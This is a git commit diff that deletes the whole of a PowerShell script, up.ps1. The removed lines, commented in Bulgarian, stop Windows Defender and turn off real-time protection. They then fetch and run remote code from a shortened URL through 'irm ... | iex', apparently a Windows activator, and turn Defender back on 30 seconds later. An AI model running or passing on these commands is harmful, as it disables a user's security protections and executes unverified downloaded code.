e8024857957f6d02046bed0650c9089f4581fd3d
acenljd <thebluepoint2@gmail.com>
2025-12-11 01:32:16 +0200

    Update up.ps1

--- up.ps1
+++ up.ps1
@@ -1,11 +1,1 @@
-# 1. Спиране на Defender услугите
-Stop-Service -Name WinDefend -Force -ErrorAction SilentlyContinue
-Set-MpPreference -DisableRealtimeMonitoring $true
 
-# 2. Пусни активатора
-irm https://dub.sh/Windows-Activator | iex
-
-# 3. След 30 секунди, върни защитата
-Start-Sleep -Seconds 30
-Set-MpPreference -DisableRealtimeMonitoring $false
-Start-Service -Name WinDefend -ErrorAction SilentlyContinue
